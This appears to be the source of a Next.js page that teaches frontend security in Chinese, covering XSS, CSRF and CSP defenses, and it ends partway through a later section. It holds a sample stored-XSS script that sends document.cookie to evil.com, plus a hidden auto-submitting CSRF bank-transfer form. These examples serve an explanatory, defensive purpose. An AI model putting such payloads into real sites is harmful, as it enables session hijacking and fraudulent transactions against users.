// app/security/page.tsx
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldX,
  Code,
  Cookie,
  Globe,
  Lock,
  Eye,
  Terminal,
  AlertTriangle,
  CheckCircle,
  XCircle,
  ArrowRight,
  Zap,
  Bug,
  Server,
  Layers,
  FileCode,
  Filter,
  Ban,
  KeyRound,
  Network,
  Scan,
} from "lucide-react";

export default function FrontendSecurityPage() {
  return (
    <div className="bg-dot-grid min-h-screen pb-24">
      {/* ========== HERO SECTION ========== */}
      <section className="container pt-10 pb-4">
        <div className="relative">
          {/* Decorative blob */}
          <div
            className="absolute -top-16 -right-16 w-64 h-64 opacity-20 -z-10"
            style={{
              background: "var(--secondary)",
              borderRadius: "60% 40% 30% 70% / 60% 30% 70% 40%",
            }}
          />
          <div
            className="absolute top-20 -left-20 w-40 h-40 opacity-15 -z-10"
            style={{
              background: "var(--tertiary)",
              borderRadius: "40% 60% 70% 30% / 30% 70% 40% 60%",
            }}
          />

          <div className="animate-pop">
            <div className="inline-flex items-center gap-2 px-4 py-1.5 mb-4 text-xs font-bold uppercase tracking-wider rounded-full"
                 style={{
                   background: "var(--accent)",
                   color: "white",
                   border: "2px solid var(--foreground)",
                   boxShadow: "4px 4px 0px 0px var(--foreground)",
                   fontFamily: '"Plus Jakarta Sans", sans-serif',
                   letterSpacing: "0.05em",
                 }}>
              <Shield className="w-3.5 h-3.5" strokeWidth={2.5} />
              FRONTEND SECURITY
            </div>

            <h1
              className="text-5xl md:text-7xl font-extrabold leading-tight mb-6"
              style={{
                fontFamily: '"Outfit", sans-serif',
                color: "var(--foreground)",
              }}
            >
              前端防御{" "}
              <span style={{ color: "var(--accent)" }}>全景解析</span>
            </h1>

            <p
              className="text-lg md:text-xl max-w-2xl leading-relaxed"
              style={{
                color: "var(--foreground)",
                opacity: 0.7,
                fontFamily: '"Plus Jakarta Sans", sans-serif',
              }}
            >
              从 XSS 到 CSRF，从 CSP 到零信任——用场景化的方式理解每一种攻击向量与防御策略，
              让安全不再是后端的专属话题。
            </p>
          </div>
        </div>
      </section>

      {/* ========== ATTACK LANDSCAPE OVERVIEW ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.1s" }}>
          <div
            className="p-6 rounded-2xl mb-12"
            style={{
              border: "3px solid var(--foreground)",
              background: "var(--card)",
              boxShadow: "8px 8px 0px 0px var(--tertiary)",
            }}
          >
            <div className="flex items-center gap-3 mb-4">
              <div
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{
                  background: "var(--tertiary)",
                  border: "2px solid var(--foreground)",
                }}
              >
                <AlertTriangle className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <h2
                className="text-xl font-extrabold"
                style={{
                  fontFamily: '"Outfit", sans-serif',
                  color: "var(--foreground)",
                }}
              >
                ⚡ 三大威胁全景图
              </h2>
            </div>
            <div className="grid md:grid-cols-3 gap-4">
              {[
                {
                  icon: <Bug className="w-6 h-6" strokeWidth={2.5} />,
                  title: "XSS",
                  subtitle: "跨站脚本攻击",
                  color: "var(--secondary)",
                  desc: "攻击者注入恶意脚本到网页，在用户浏览器中执行",
                  risk: "窃取 Cookie / 会话劫持 / 键盘记录",
                },
                {
                  icon: <Globe className="w-6 h-6" strokeWidth={2.5} />,
                  title: "CSRF",
                  subtitle: "跨站请求伪造",
                  color: "var(--accent)",
                  desc: "利用用户已登录的身份，伪造请求执行非预期操作",
                  risk: "转账 / 修改密码 / 删除数据",
                },
                {
                  icon: <Layers className="w-6 h-6" strokeWidth={2.5} />,
                  title: "CSP",
                  subtitle: "内容安全策略",
                  color: "var(--quaternary)",
                  desc: "浏览器安全机制，限制页面可加载的资源来源",
                  risk: "主动防御层 / 减小攻击面",
                },
              ].map((item, i) => (
                <div
                  key={i}
                  className="p-5 rounded-xl text-center"
                  style={{
                    border: "2px solid var(--foreground)",
                    background: "white",
                    boxShadow: `4px 4px 0px 0px ${item.color}`,
                  }}
                >
                  <div
                    className="w-14 h-14 rounded-2xl flex items-center justify-center mx-auto mb-3"
                    style={{
                      background: item.color,
                      border: "2px solid var(--foreground)",
                      color: "white",
                    }}
                  >
                    {item.icon}
                  </div>
                  <h3
                    className="text-2xl font-extrabold"
                    style={{ fontFamily: '"Outfit", sans-serif' }}
                  >
                    {item.title}
                  </h3>
                  <p
                    className="text-sm font-bold mt-1"
                    style={{ color: item.color }}
                  >
                    {item.subtitle}
                  </p>
                  <p
                    className="text-sm mt-3 leading-relaxed"
                    style={{ fontFamily: '"Plus Jakarta Sans", sans-serif', opacity: 0.7 }}
                  >
                    {item.desc}
                  </p>
                  <div
                    className="mt-3 px-3 py-1.5 rounded-full text-xs font-bold inline-block"
                    style={{
                      background: `${item.color}15`,
                      border: `1.5px solid ${item.color}`,
                      color: item.color,
                    }}
                  >
                    {item.risk}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ========== XSS SECTION ========== */}
      <section className="container mt-8">
        <div className="animate-slide" style={{ animationDelay: "0.15s" }}>
          {/* Section Header */}
          <div className="flex items-center gap-4 mb-8">
            <div
              className="w-14 h-14 rounded-2xl flex items-center justify-center"
              style={{
                background: "var(--secondary)",
                border: "3px solid var(--foreground)",
                boxShadow: "4px 4px 0px 0px var(--foreground)",
              }}
            >
              <Bug className="w-7 h-7 text-white" strokeWidth={2.5} />
            </div>
            <div>
              <h2
                className="text-4xl md:text-5xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                XSS 攻击
              </h2>
              <p className="text-sm font-bold uppercase tracking-wider mt-1"
                 style={{ color: "var(--secondary)", letterSpacing: "0.05em" }}>
                CROSS-SITE SCRIPTING
              </p>
            </div>
          </div>

          {/* Attack Scenario Story */}
          <div className="grid md:grid-cols-2 gap-6 mb-8">
            {/* Attack Flow */}
            <div
              className="p-6 rounded-2xl"
              style={{
                background: "var(--card)",
                border: "2px solid var(--foreground)",
                boxShadow: "8px 8px 0px 0px var(--secondary)",
              }}
            >
              <h3
                className="text-xl font-extrabold mb-5 flex items-center gap-2"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                <Eye className="w-5 h-5" style={{ color: "var(--secondary)" }} strokeWidth={2.5} />
                场景：评论区陷阱
              </h3>

              {/* Step-by-step attack flow */}
              <div className="space-y-0">
                {[
                  {
                    step: "1",
                    icon: <Code className="w-4 h-4" />,
                    title: "攻击者发帖",
                    desc: '在评论区提交包含恶意脚本的内容',
                    code: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
                  },
                  {
                    step: "2",
                    icon: <Server className="w-4 h-4" />,
                    title: "服务端存储",
                    desc: "恶意内容未经转义直接存入数据库（存储型 XSS）",
                    code: 'INSERT INTO comments (body) VALUES ("<script>...")',
                  },
                  {
                    step: "3",
                    icon: <Eye className="w-4 h-4" />,
                    title: "用户浏览",
                    desc: "正常用户访问页面，脚本在浏览器中自动执行",
                    code: "innerHTML = comment.body // 💀 直接渲染",
                  },
                  {
                    step: "4",
                    icon: <Cookie className="w-4 h-4" />,
                    title: "数据泄露",
                    desc: "Cookie、Token 被发送到攻击者服务器",
                    code: '→ evil.com/steal?c=session=abc123...',
                  },
                ].map((item, i) => (
                  <div key={i} className="flex gap-4">
                    {/* Timeline */}
                    <div className="flex flex-col items-center">
                      <div
                        className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-white text-xs font-bold"
                        style={{
                          background: "var(--secondary)",
                          border: "2px solid var(--foreground)",
                        }}
                      >
                        {item.step}
                      </div>
                      {i < 3 && (
                        <div
                          className="w-0.5 flex-1 min-h-[20px]"
                          style={{
                            borderLeft: "2px dashed var(--border)",
                          }}
                        />
                      )}
                    </div>
                    {/* Content */}
                    <div className="pb-4 flex-1 min-w-0">
                      <p className="font-bold text-sm flex items-center gap-1.5"
                         style={{ fontFamily: '"Outfit", sans-serif' }}>
                        {item.title}
                      </p>
                      <p className="text-xs mt-1 opacity-60"
                         style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                        {item.desc}
                      </p>
                      <div
                        className="mt-2 px-3 py-2 rounded-lg text-xs overflow-x-auto"
                        style={{
                          background: "var(--background)",
                          border: "1.5px solid var(--border)",
                          fontFamily: '"Courier New", monospace',
                          color: "var(--secondary)",
                          whiteSpace: "nowrap",
                        }}
                      >
                        {item.code}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* XSS Types */}
            <div className="space-y-4">
              {[
                {
                  type: "存储型 XSS",
                  tag: "STORED",
                  tagColor: "var(--secondary)",
                  icon: <Server className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  scenario: "攻击者将恶意脚本存入服务器（评论/帖子/个人资料）",
                  impact: "所有访问该页面的用户都会中招",
                  severity: "🔴 严重",
                },
                {
                  type: "反射型 XSS",
                  tag: "REFLECTED",
                  tagColor: "var(--accent)",
                  icon: <Zap className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  scenario: '恶意代码在 URL 参数中，服务端"反射"到页面响应',
                  impact: '需要诱骗用户点击恶意链接，典型: "?search=<script>"',
                  severity: "🟡 中等",
                },
                {
                  type: "DOM 型 XSS",
                  tag: "DOM-BASED",
                  tagColor: "var(--tertiary)",
                  icon: <FileCode className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  scenario: "前端 JS 直接操作 DOM 时未过滤用户输入",
                  impact: "不经过服务器，纯前端漏洞，难以被 WAF 检测",
                  severity: "🟠 较高",
                },
              ].map((item, i) => (
                <div
                  key={i}
                  className="topic-card p-5 rounded-xl"
                  style={{ boxShadow: `6px 6px 0px 0px ${item.tagColor}` }}
                >
                  <div className="flex items-start gap-3">
                    <div
                      className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0"
                      style={{
                        background: item.tagColor,
                        border: "2px solid var(--foreground)",
                      }}
                    >
                      {item.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <h4
                          className="text-lg font-extrabold"
                          style={{ fontFamily: '"Outfit", sans-serif' }}
                        >
                          {item.type}
                        </h4>
                        <span
                          className="text-[10px] font-bold px-2 py-0.5 rounded-full uppercase tracking-wider"
                          style={{
                            background: item.tagColor,
                            color: "white",
                            border: "1.5px solid var(--foreground)",
                          }}
                        >
                          {item.tag}
                        </span>
                      </div>
                      <p
                        className="text-sm mt-2 leading-relaxed opacity-75"
                        style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}
                      >
                        🎯 {item.scenario}
                      </p>
                      <p
                        className="text-sm mt-1.5 leading-relaxed opacity-75"
                        style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}
                      >
                        💥 {item.impact}
                      </p>
                      <span className="text-xs font-bold mt-2 inline-block">{item.severity}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* XSS Defense Code */}
          <div
            className="p-6 rounded-2xl mb-8"
            style={{
              background: "var(--card)",
              border: "2px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--quaternary)",
            }}
          >
            <div className="flex items-center gap-3 mb-5">
              <div
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{
                  background: "var(--quaternary)",
                  border: "2px solid var(--foreground)",
                }}
              >
                <ShieldCheck className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <h3
                className="text-xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                ✅ XSS 防御代码实战
              </h3>
            </div>

            <div className="grid md:grid-cols-2 gap-4">
              {/* Escape function */}
              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid var(--foreground)" }}
              >
                <div
                  className="px-4 py-2 flex items-center gap-2"
                  style={{
                    background: "var(--foreground)",
                    color: "white",
                  }}
                >
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span
                    className="text-xs font-bold"
                    style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}
                  >
                    HTML 转义函数
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#1E293B",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(
    /[&<>"']/g,
    (c) => map[c]
  );
}`}
                </pre>
              </div>

              {/* Safe rendering */}
              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid var(--foreground)" }}
              >
                <div
                  className="px-4 py-2 flex items-center gap-2"
                  style={{
                    background: "var(--foreground)",
                    color: "white",
                  }}
                >
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span
                    className="text-xs font-bold"
                    style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}
                  >
                    React 安全渲染
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#1E293B",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`// ✅ React 默认安全 — 自动转义
<p>{userInput}</p>

// ❌ 危险！直接插入 HTML
<div dangerouslySetInnerHTML={{
  __html: userInput  // 💀 XSS!
}} />

// ✅ 必须先用 DOMPurify 消毒
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />`}
                </pre>
              </div>
            </div>

            {/* Defense Checklist */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mt-5">
              {[
                { icon: <Filter className="w-4 h-4" />, text: "输出编码", status: "必须" },
                { icon: <Scan className="w-4 h-4" />, text: "输入验证", status: "必须" },
                { icon: <Cookie className="w-4 h-4" />, text: "HttpOnly Cookie", status: "推荐" },
                { icon: <Lock className="w-4 h-4" />, text: "CSP 策略", status: "推荐" },
              ].map((item, i) => (
                <div
                  key={i}
                  className="flex items-center gap-2 px-3 py-2.5 rounded-xl"
                  style={{
                    background: "var(--background)",
                    border: "2px solid var(--border)",
                  }}
                >
                  <div
                    className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: "var(--quaternary)",
                      color: "white",
                    }}
                  >
                    {item.icon}
                  </div>
                  <div>
                    <p className="text-xs font-bold" style={{ fontFamily: '"Outfit", sans-serif' }}>
                      {item.text}
                    </p>
                    <p className="text-[10px] opacity-50">{item.status}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ========== CSRF SECTION ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.2s" }}>
          {/* Section Header */}
          <div className="flex items-center gap-4 mb-8">
            <div
              className="w-14 h-14 rounded-2xl flex items-center justify-center"
              style={{
                background: "var(--accent)",
                border: "3px solid var(--foreground)",
                boxShadow: "4px 4px 0px 0px var(--foreground)",
              }}
            >
              <Globe className="w-7 h-7 text-white" strokeWidth={2.5} />
            </div>
            <div>
              <h2
                className="text-4xl md:text-5xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                CSRF 攻击
              </h2>
              <p className="text-sm font-bold uppercase tracking-wider mt-1"
                 style={{ color: "var(--accent)", letterSpacing: "0.05em" }}>
                CROSS-SITE REQUEST FORGERY
              </p>
            </div>
          </div>

          {/* CSRF Attack Flow Diagram */}
          <div
            className="p-6 md:p-8 rounded-2xl mb-8"
            style={{
              background: "var(--card)",
              border: "2px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--accent)",
            }}
          >
            <h3
              className="text-xl font-extrabold mb-6 flex items-center gap-2"
              style={{ fontFamily: '"Outfit", sans-serif' }}
            >
              <Network className="w-5 h-5" style={{ color: "var(--accent)" }} strokeWidth={2.5} />
              场景：银行转账陷阱
            </h3>

            {/* Visual Flow */}
            <div className="flex flex-col md:flex-row items-stretch gap-4 mb-8">
              {[
                {
                  icon: <Eye className="w-6 h-6" />,
                  label: "受害者",
                  sublabel: "已登录银行网站",
                  color: "var(--quaternary)",
                },
                {
                  icon: <Globe className="w-6 h-6" />,
                  label: "恶意网站",
                  sublabel: "藏有伪造请求",
                  color: "var(--secondary)",
                },
                {
                  icon: <Server className="w-6 h-6" />,
                  label: "银行服务器",
                  sublabel: "无法区分请求来源",
                  color: "var(--accent)",
                },
              ].map((node, i) => (
                <div key={i} className="flex items-center gap-3 flex-1">
                  <div className="flex-1 p-4 rounded-xl text-center"
                       style={{
                         border: `2px solid ${node.color}`,
                         boxShadow: `4px 4px 0px 0px ${node.color}`,
                         background: "white",
                       }}>
                    <div
                      className="w-12 h-12 rounded-xl flex items-center justify-center mx-auto mb-2 text-white"
                      style={{
                        background: node.color,
                        border: "2px solid var(--foreground)",
                      }}
                    >
                      {node.icon}
                    </div>
                    <p className="font-bold text-sm" style={{ fontFamily: '"Outfit", sans-serif' }}>
                      {node.label}
                    </p>
                    <p className="text-[11px] opacity-60 mt-0.5">{node.sublabel}</p>
                  </div>
                  {i < 2 && (
                    <div className="hidden md:flex items-center">
                      <ArrowRight className="w-5 h-5 opacity-30" />
                    </div>
                  )}
                </div>
              ))}
            </div>

            {/* Attack Steps */}
            <div className="grid md:grid-cols-2 gap-4">
              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid var(--foreground)" }}
              >
                <div className="px-4 py-2 flex items-center gap-2"
                     style={{ background: "var(--secondary)", color: "white" }}>
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span className="text-xs font-bold" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    恶意网站中隐藏的表单
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#1E293B",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`<!-- 恶意网站中的隐藏表单 -->
<form action="https://bank.com/transfer"
      method="POST"
      id="csrf-form">
  <input type="hidden"
         name="to" value="attacker" />
  <input type="hidden"
         name="amount" value="99999" />
</form>

<!-- 页面加载后自动提交 -->
<script>
  document.getElementById('csrf-form')
    .submit();
</script>`}
                </pre>
              </div>

              <div className="space-y-3">
                <div className="p-4 rounded-xl"
                     style={{
                       background: "var(--secondary)",
                       color: "white",
                       border: "2px solid var(--foreground)",
                       boxShadow: "4px 4px 0px 0px var(--foreground)",
                     }}>
                  <p className="text-sm font-bold flex items-center gap-2"
                     style={{ fontFamily: '"Outfit", sans-serif' }}>
                    <XCircle className="w-4 h-4" strokeWidth={2.5} />
                    为什么能成功？
                  </p>
                  <p className="text-sm mt-2 leading-relaxed opacity-90"
                     style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    浏览器会自动携带目标域的 Cookie！银行服务器收到请求后，看到有合法的 Session Cookie，
                    就认为这是用户本人的操作。<strong>Cookie 无法区分"用户意愿"还是"自动提交"</strong>。
                  </p>
                </div>
                <div className="p-4 rounded-xl"
                     style={{
                       background: "var(--tertiary)",
                       border: "2px solid var(--foreground)",
                       boxShadow: "4px 4px 0px 0px var(--foreground)",
                     }}>
                  <p className="text-sm font-bold flex items-center gap-2"
                     style={{ fontFamily: '"Outfit", sans-serif' }}>
                    <AlertTriangle className="w-4 h-4" strokeWidth={2.5} />
                    关键前提条件
                  </p>
                  <ul className="text-sm mt-2 space-y-1.5 opacity-80"
                      style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    <li>• 用户已在目标网站登录（有有效 Session）</li>
                    <li>• 目标网站仅依赖 Cookie 进行身份验证</li>
                    <li>• 操作可通过简单的 HTTP 请求完成</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>

          {/* CSRF Defense Methods */}
          <div
            className="p-6 rounded-2xl"
            style={{
              background: "var(--card)",
              border: "2px solid var(--foreground)",
              boxShadow: "8px 8px 0px 0px var(--quaternary)",
            }}
          >
            <div className="flex items-center gap-3 mb-5">
              <div
                className="w-10 h-10 rounded-xl flex items-center justify-center"
                style={{
                  background: "var(--quaternary)",
                  border: "2px solid var(--foreground)",
                }}
              >
                <ShieldCheck className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <h3
                className="text-xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                ✅ CSRF 防御方案
              </h3>
            </div>

            <div className="grid md:grid-cols-3 gap-4">
              {[
                {
                  title: "CSRF Token",
                  icon: <KeyRound className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  color: "var(--accent)",
                  desc: "服务端生成随机 Token，嵌入表单/请求头。攻击者无法获取该 Token。",
                  code: `<input type="hidden"\n  name="_csrf"\n  value="a8b3c9d..." />`,
                  tag: "最常用",
                },
                {
                  title: "SameSite Cookie",
                  icon: <Cookie className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  color: "var(--secondary)",
                  desc: '设置 Cookie 的 SameSite 属性，阻止跨站携带 Cookie。',
                  code: `Set-Cookie: session=abc;\n  SameSite=Strict;\n  Secure; HttpOnly`,
                  tag: "推荐",
                },
                {
                  title: "双重验证",
                  icon: <Lock className="w-5 h-5 text-white" strokeWidth={2.5} />,
                  color: "var(--tertiary)",
                  desc: "敏感操作（转账/改密码）要求二次确认，如短信验证码、密码确认。",
                  code: `// 前端拦截 → 弹窗确认\nconst ok = await\n  showConfirmDialog();`,
                  tag: "高安全",
                },
              ].map((item, i) => (
                <div
                  key={i}
                  className="p-5 rounded-xl"
                  style={{
                    border: "2px solid var(--foreground)",
                    boxShadow: `5px 5px 0px 0px ${item.color}`,
                    background: "white",
                  }}
                >
                  <div className="flex items-center gap-2 mb-3">
                    <div
                      className="w-9 h-9 rounded-lg flex items-center justify-center"
                      style={{
                        background: item.color,
                        border: "2px solid var(--foreground)",
                      }}
                    >
                      {item.icon}
                    </div>
                    <div>
                      <h4 className="text-sm font-extrabold"
                          style={{ fontFamily: '"Outfit", sans-serif' }}>
                        {item.title}
                      </h4>
                      <span
                        className="text-[10px] font-bold px-1.5 py-0.5 rounded-full"
                        style={{
                          background: item.color,
                          color: "white",
                        }}
                      >
                        {item.tag}
                      </span>
                    </div>
                  </div>
                  <p className="text-sm leading-relaxed opacity-70 mb-3"
                     style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    {item.desc}
                  </p>
                  <pre
                    className="px-3 py-2 rounded-lg text-xs overflow-x-auto"
                    style={{
                      background: "#1E293B",
                      color: "#E2E8F0",
                      fontFamily: '"Courier New", monospace',
                    }}
                  >
                    {item.code}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ========== CSP SECTION ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.25s" }}>
          {/* Section Header */}
          <div className="flex items-center gap-4 mb-8">
            <div
              className="w-14 h-14 rounded-2xl flex items-center justify-center"
              style={{
                background: "var(--tertiary)",
                border: "3px solid var(--foreground)",
                boxShadow: "4px 4px 0px 0px var(--foreground)",
              }}
            >
              <Layers className="w-7 h-7 text-white" strokeWidth={2.5} />
            </div>
            <div>
              <h2
                className="text-4xl md:text-5xl font-extrabold"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                CSP 策略
              </h2>
              <p className="text-sm font-bold uppercase tracking-wider mt-1"
                 style={{ color: "var(--tertiary)", letterSpacing: "0.05em" }}>
                CONTENT SECURITY POLICY
              </p>
            </div>
          </div>

          {/* CSP Explanation */}
          <div className="grid md:grid-cols-5 gap-6 mb-8">
            {/* Main CSP Card */}
            <div
              className="md:col-span-3 p-6 rounded-2xl"
              style={{
                background: "var(--card)",
                border: "2px solid var(--foreground)",
                boxShadow: "8px 8px 0px 0px var(--tertiary)",
              }}
            >
              <h3
                className="text-xl font-extrabold mb-4 flex items-center gap-2"
                style={{ fontFamily: '"Outfit", sans-serif' }}
              >
                <Shield className="w-5 h-5" style={{ color: "var(--tertiary)" }} strokeWidth={2.5} />
                什么是 CSP？
              </h3>
              <p className="text-sm leading-relaxed opacity-70 mb-4"
                 style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                Content Security Policy 是一个 HTTP 响应头，告诉浏览器<strong>只允许加载和执行哪些来源的资源</strong>。
                它是 XSS 攻击的最后一道防线——即使攻击者注入了脚本，浏览器也会拒绝执行。
              </p>

              {/* How CSP blocks XSS */}
              <div className="p-4 rounded-xl mb-4"
                   style={{
                     background: "var(--background)",
                     border: "2px dashed var(--border)",
                   }}>
                <p className="text-xs font-bold mb-3 uppercase tracking-wider"
                   style={{ color: "var(--tertiary)", letterSpacing: "0.05em" }}>
                  🛡️ CSP 如何阻止 XSS
                </p>
                <div className="flex flex-col gap-2">
                  {[
                    {
                      text: "攻击者注入 <script>alert(1)</script>",
                      type: "attack",
                    },
                    {
                      text: "浏览器检查 CSP：inline script 是否被允许？",
                      type: "check",
                    },
                    {
                      text: 'CSP 策略: script-src \'self\' — 禁止内联脚本!',
                      type: "block",
                    },
                    {
                      text: "🚫 浏览器拒绝执行，控制台报错",
                      type: "result",
                    },
                  ].map((step, i) => (
                    <div
                      key={i}
                      className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs"
                      style={{
                        background:
                          step.type === "attack"
                            ? "var(--secondary)"
                            : step.type === "block"
                            ? "var(--tertiary)"
                            : step.type === "result"
                            ? "var(--quaternary)"
                            : "white",
                        color:
                          step.type === "attack" || step.type === "block" || step.type === "result"
                            ? "white"
                            : "var(--foreground)",
                        border: "1.5px solid var(--foreground)",
                        fontFamily: '"Courier New", monospace',
                        fontWeight: 600,
                      }}
                    >
                      <span className="w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold flex-shrink-0"
                            style={{
                              background: step.type === "result" ? "white" : "var(--foreground)",
                              color: step.type === "result" ? "var(--foreground)" : "white",
                            }}>
                        {i + 1}
                      </span>
                      {step.text}
                    </div>
                  ))}
                </div>
              </div>

              {/* CSP Header Config */}
              <div
                className="rounded-xl overflow-hidden"
                style={{ border: "2px solid var(--foreground)" }}
              >
                <div className="px-4 py-2 flex items-center gap-2"
                     style={{ background: "var(--foreground)", color: "white" }}>
                  <Terminal className="w-4 h-4" strokeWidth={2.5} />
                  <span className="text-xs font-bold" style={{ fontFamily: '"Plus Jakarta Sans", sans-serif' }}>
                    CSP 头部配置示例
                  </span>
                </div>
                <pre
                  className="p-4 text-sm leading-relaxed overflow-x-auto"
                  style={{
                    background: "#1E293B",
                    color: "#E2E8F0",
                    fontFamily: '"Courier New", monospace',
                  }}
                >
{`// Next.js middleware / server headers
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';`}
                </pre>
              </div>
            </div>

            {/* CSP Directives Quick Reference */}
            <div className="md:col-span-2 space-y-3">
              <div className="p-4 rounded-xl"
                   style={{
                     background: "var(--tertiary)",
                     border: "2px solid var(--foreground)",
                     boxShadow: "4px 4px 0px 0px var(--foreground)",
                   }}>
                <h4 className="text-sm font-extrabold mb-3 flex items-center gap-2"
                    style={{ fontFamily: '"Outfit", sans-serif' }}>
                  📋 常用指令速查
                </h4>
                <div className="space-y-2">
                  {[
                    { dir: "script-src", desc: "控制 JS 来源" },
                    { dir: "style-src", desc: "控制 CSS 来源" },
                    { dir: "img-src", desc: "控制图片来源" },
                    { dir: "connect-src", desc: "控制 fetch/XHR" },
                    { dir: "font-src", desc: "控制字体来源" },
                    { dir: "frame-ancestors", desc: "控制 iframe 嵌入" },
                    { dir: "base-uri", desc: "限制 <base> 标签" },
                    { dir: "form-action", desc: "限制表单提交目标" },
                  ].map((item, i) => (
                    <div key={i} className="flex items-center justify-between gap-2 px-2 py-1.5 rounded-lg"
                         style={{ background: "rgba(255,255,255,0.5)" }}>
                      <code className="text-xs font-bold" style={{ fontFamily: '"Courier New", monospace' }}>
                        {item.dir}
                      </code>
                      <span className="text-[11px] opacity-70">{item.desc}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* CSP Keywords */}
              <div className="p-4 rounded-xl"
                   style={{
                     background: "var(--card)",
                     border: "2px solid var(--foreground)",
                     boxShadow: "4px 4px 0px 0px var(--accent)",
                   }}>
                <h4 className="text-sm font-extrabold mb-3 flex items-center gap-2"
                    style={{ fontFamily: '"Outfit", sans-serif' }}>
                  🔑 关键字说明
                </h4>
                <div className="space-y-2">
                  {[
                    { kw: "'self'", desc: "同源资源", safe: true },
                    { kw: "'none'", desc: "禁止任何资源", safe: true },
                    { kw: "'unsafe-inline'", desc: "允许内联代码", safe: false },
                    { kw: "'unsafe-eval'", desc: "允许 eval()", safe: false },
                    { kw: "'nonce-{val}'", desc: "白名单随机数", safe: true },
                    { kw: "'sha256-{hash}'", desc: "哈希白名单", safe: true },
                  ].map((item, i) => (
                    <div key={i} className="flex items-center gap-2">
                      <code className="text-xs px-1.5 py-0.5 rounded"
                            style={{
                              background: item.safe ? "var(--quaternary)" : "var(--secondary)",
                              color: "white",
                              fontFamily: '"Courier New", monospace',
                              fontWeight: 700,
                              border: "1.5px solid var(--foreground)",
                            }}>
                        {item.kw}
                      </code>
                      <span className="text-[11px] opacity-60">{item.desc}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ========== ADDITIONAL DEFENSES ========== */}
      <section className="container mt-16">
        <div className="animate-slide" style={{ animationDelay: "0.3s" }}>
          <div className="flex items-center gap-4 mb-8">
            <div
              className="w-14 h-14 rounded-2xl flex items-center justify-center"
              style={{
                background: "var(--quaternary)",
                border: "3px solid var(--foreground)",
                boxShadow: "4px 4px 0px 0px var(--foreground)",
              }}
            >
